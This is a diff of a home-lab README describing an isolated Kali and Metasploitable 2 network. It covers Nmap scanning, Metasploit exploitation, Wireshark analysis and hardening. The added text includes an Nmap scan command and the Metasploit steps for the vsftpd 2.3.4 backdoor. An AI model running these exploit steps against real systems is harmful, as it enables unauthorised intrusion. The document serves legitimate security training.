@@ -15,13 +15,13 @@ The purpose of this project is to develop practical cyber security skills aligne
 ### Virtual Machines
 - Kali Linux (Attacker machine)
 - Metasploitable 2 (Vulnerable target machine)
-- Windows VM (optional for additional testing)
+- Windows VM (optional)
 
 ---
 
 ## 🌐 Network Configuration
 
-The lab is configured using an isolated internal network to safely simulate attacks without impacting external systems.
+The lab is configured using an isolated internal network to safely simulate attacks.
 
 Example IP configuration:
 
@@ -32,68 +32,99 @@ Metasploitable:    192.168.56.102
 
 ## 🛠️ Tools Used
 
-### Nmap
-Used for network discovery and port scanning to identify active hosts and open services.
-
-Example command:
-nmap -sV 192.168.56.102
-
----
-
-### Wireshark
-Used for packet capture and analysis to monitor network traffic and identify suspicious activity.
-
----
-
-### Metasploit Framework
-Used to exploit known vulnerabilities within the Metasploitable machine and gain access.
+- Nmap – Network scanning and enumeration  
+- Wireshark – Packet capture and analysis  
+- Metasploit Framework – Exploitation  
 
 ---
 
 ## ⚔️ Activities Performed
 
 ### 1. Network Scanning
-- Identified live hosts within the network
-- Discovered open ports and running services
-- Detected potential vulnerabilities based on service versions
+
+Nmap was used to identify open ports and services running on the target machine.
+
+Command used:
+
+```
+nmap -sV -A 192.168.56.102
+```
+
+Example output:
+
+```
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.3.4
+22/tcp   open  ssh     OpenSSH 4.7p1
+80/tcp   open  http    Apache httpd 2.2.8
+```
+
+This revealed multiple outdated services that are known to contain vulnerabilities.
 
 ---
 
 ### 2. Vulnerability Identification
-- Analysed scan results to identify outdated or insecure services
-- Mapped findings to known vulnerabilities (CVEs)
+
+The scan results were analysed to identify potential vulnerabilities. For example:
+
+- vsftpd 2.3.4 → known backdoor vulnerability  
+- Outdated Apache version → potential exploit paths  
+
+These findings demonstrate how attackers identify weak points in a system.
 
 ---
 
 ### 3. Exploitation
-- Used Metasploit Framework to exploit vulnerabilities
-- Successfully gained access to the target system
-- Demonstrated how attackers can move from discovery to compromise
+
+The Metasploit Framework was used to exploit the vsftpd vulnerability.
+
+Steps:
+
+```
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 192.168.56.102
+run
+```
+
+Result:
+- Successful access to the target machine  
+- Demonstrated how unpatched services can lead to system compromise  
 
 ---
 
 ### 4. Traffic Analysis
-- Captured network traffic using Wireshark
-- Analysed packets to observe communication between attacker and target
-- Identified patterns that could indicate malicious activity
+
+Wireshark was used to capture and analyse network traffic during the attack.
+
+Key observations:
+- TCP handshake process  
+- Suspicious traffic patterns during exploitation  
+- Communication between attacker and target system  
+
+This demonstrates how defenders can detect malicious activity through packet analysis.
 
 ---
 
 ### 5. System Hardening
-- Disabled unnecessary services on the target machine
-- Applied basic firewall configurations
-- Reduced attack surface and improved system security
-- Re-scanned system to confirm improvements
+
+Basic defensive measures were applied to reduce vulnerabilities:
+
+- Disabled unnecessary services  
+- Restricted open ports  
+- Applied firewall rules  
+
+The system was re-scanned to confirm a reduced attack surface.
 
 ---
 
 ## 🧠 Key Learning Outcomes
 
-- Gained hands-on experience with network scanning and enumeration
-- Developed understanding of common vulnerabilities and exploitation techniques
-- Learned how attackers identify and exploit weaknesses in systems
-- Improved knowledge of defensive techniques such as system hardening
-- Developed ability to analyse network traffic for security purposes
+- Practical experience with network scanning and enumeration  
+- Understanding of real-world vulnerabilities and exploitation techniques  
+- Ability to use industry tools such as Nmap, Wireshark, and Metasploit  
+- Awareness of how attackers operate and how to defend against them  
+- Improved understanding of system hardening and risk reduction  
 
 ---
 
@@ -109,6 +140,6 @@ Home-Lab-Virtual-Network
 
 ## 📊 Conclusion
 
-This project demonstrates practical cyber security skills including network enumeration, vulnerability assessment, exploitation, and defensive strategies. It highlights the importance of proactive security measures and provides a foundation for more advanced cyber security practices.
+This project demonstrates hands-on cyber security skills including network enumeration, vulnerability assessment, exploitation, and defensive strategies.
 
-The lab environment will continue to be expanded with additional tools, attack scenarios, and monitoring solutions.
+It highlights the importance of identifying vulnerabilities early and applying appropriate mitigation techniques to reduce risk. This lab provides a strong foundation for further development in penetration testing and security operations roles.
